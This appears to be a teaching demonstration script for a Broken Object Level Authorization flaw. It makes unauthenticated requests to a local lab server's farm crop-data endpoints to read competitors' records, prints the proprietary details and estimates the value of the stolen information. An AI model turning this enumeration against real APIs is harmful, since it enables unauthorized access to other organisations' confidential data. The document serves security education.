#!/usr/bin/env python3
"""
BOLA Exploitation Script - Proprietary Crop Data Theft

This script demonstrates how a malicious actor can exploit Broken Object Level
Authorization (BOLA) to access proprietary crop data from other farms.

In this agricultural scenario:
- Each farm has proprietary crop techniques, schedules, and yield projections
- This information provides competitive advantages and represents intellectual property
- The vulnerability allows competitors to steal this proprietary information
"""

import requests
import json
import time
from datetime import datetime
import sys

# Base URL of the data server
BASE_URL = "http://localhost:8800"  # Adjust port as needed

def get_farm_crop_data(farm_id, field_id):
    """Attempt to access a farm's proprietary crop data"""
    url = f"{BASE_URL}/farm/{farm_id}/crop-data/{field_id}"
    
    print(f"Requesting: {url}")
    response = requests.get(url)
    
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Failed to get crop data: {response.status_code} - {response.text}")
        return None

def print_crop_data(crop_data, farm_id, field_id):
    """Print formatted crop data with agricultural context"""
    if not crop_data:
        print(f"No data available for Farm {farm_id}, Field {field_id}")
        return
    
    print(f"\nüìä CROP DATA FOR FARM {farm_id.upper()}, FIELD {field_id} üìä")
    print("-" * 60)
    
    print(f"üå± Crop: {crop_data['crop_type']} ({crop_data['variety']})")
    print(f"üìÖ Planting date: {crop_data['planting_date']}")
    print(f"üóìÔ∏è Expected harvest: {crop_data['expected_harvest_date']}")
    print(f"üìà Projected yield: {crop_data['expected_yield']} tons/hectare")
    print(f"üåø Current growth stage: {crop_data['growth_stage']}")
    
    print("\nüíß IRRIGATION SCHEDULE:")
    for key, value in crop_data['irrigation_schedule'].items():
        print(f"  ‚Ä¢ {key}: {value}")
    
    print("\nüß™ FERTILIZER PROGRAM:")
    for key, value in crop_data['fertilizer_schedule'].items():
        print(f"  ‚Ä¢ {key}: {value}")
    
    print("\nüêû PEST CONTROL MEASURES:")
    for measure in crop_data['pest_control_measures']:
        print(f"  ‚Ä¢ {measure}")
    
    # Most valuable proprietary information
    if crop_data.get('proprietary_techniques'):
        print("\nüîí PROPRIETARY TECHNIQUES (HIGH VALUE INTELLECTUAL PROPERTY):")
        for technique in crop_data['proprietary_techniques']:
            print(f"  ‚Ä¢ {technique}")

def estimate_financial_impact(crop_data):
    """Estimate the financial impact of stolen crop data"""
    if not crop_data:
        return
    
    # These are simplified calculations for demonstration purposes
    market_price_per_ton = {
        "tomato": 800,
        "cucumber": 650,
        "corn": 175,
        "wheat": 220
    }.get(crop_data["crop_type"].lower(), 500)
    
    total_value = crop_data["expected_yield"] * market_price_per_ton
    
    # Proprietary techniques typically provide 10-30% yield advantages
    if crop_data.get("proprietary_techniques"):
        technique_count = len(crop_data["proprietary_techniques"])
        competitive_advantage = 0.05 * technique_count  # 5% per technique
        advantage_value = total_value * competitive_advantage
    else:
        competitive_advantage = 0
        advantage_value = 0
    
    print("\nüí∞ ESTIMATED FINANCIAL IMPACT OF DATA THEFT:")
    print(f"  ‚Ä¢ Market value of crop: ${total_value:,.2f}")
    print(f"  ‚Ä¢ Competitive advantage: {competitive_advantage*100:.1f}%")
    print(f"  ‚Ä¢ Value of stolen IP: ${advantage_value:,.2f}")
    
    return advantage_value

def main():
    """Main exploitation demonstration"""
    print("="*80)
    print("üö® BOLA VULNERABILITY DEMONSTRATION: PROPRIETARY CROP DATA THEFT üö®")
    print("="*80)
    print("\nThis demonstration shows how a malicious actor can steal valuable")
    print("proprietary agricultural data from competitor farms.")
    print("\nScenario: A farm owner is attempting to steal growing techniques and")
    print("yield projections from neighboring farms to gain market advantages.\n")
    
    # List of farms and fields to target
    targets = [
        ("farm_a", "field_1"),
        ("farm_a", "field_2"),
        ("farm_b", "field_1"),
        ("farm_c", "field_1")
    ]
    
    total_ip_value = 0
    
    # Let's say we're Farm B and we're attacking our competitors
    print("ü•∑ ATTACKER PERSPECTIVE: You are Farm B spying on competitors")
    
    for farm_id, field_id in targets:
        # Skip our own farm in this scenario
        if farm_id == "farm_b":
            print(f"\nSkipping {farm_id}/{field_id} (this is our own farm)")
            continue
            
        print(f"\n\n{'='*60}")
        print(f"üîç TARGETING: Farm {farm_id.upper()}, Field {field_id}")
        print(f"{'='*60}")
        
        # Attempt to steal crop data
        crop_data = get_farm_crop_data(farm_id, field_id)
        
        if crop_data:
            print_crop_data(crop_data, farm_id, field_id)
            ip_value = estimate_financial_impact(crop_data)
            if ip_value:
                total_ip_value += ip_value
        
        time.sleep(1)  # Pause for readability
    
    print("\n\n" + "="*70)
    print("\nüîç VULNERABILITY ANALYSIS:")
    print("This BOLA vulnerability allows unauthorized access to highly sensitive")
    print("agricultural data that represents significant intellectual property.")
    print(f"\nTotal estimated value of stolen intellectual property: ${total_ip_value:,.2f}")
    print("\nImpacts of this vulnerability in agriculture:")
    print("  - Loss of competitive advantage from proprietary growing techniques")
    print("  - Market timing advantages from knowing competitors' harvest dates")
    print("  - Ability to replicate unique growing processes without R&D investment")
    print("  - Undermining of sustainable farming practices if shortcuts are taken")
    print("  - Potential for targeted market manipulation based on yield predictions")

if __name__ == "__main__":
    main()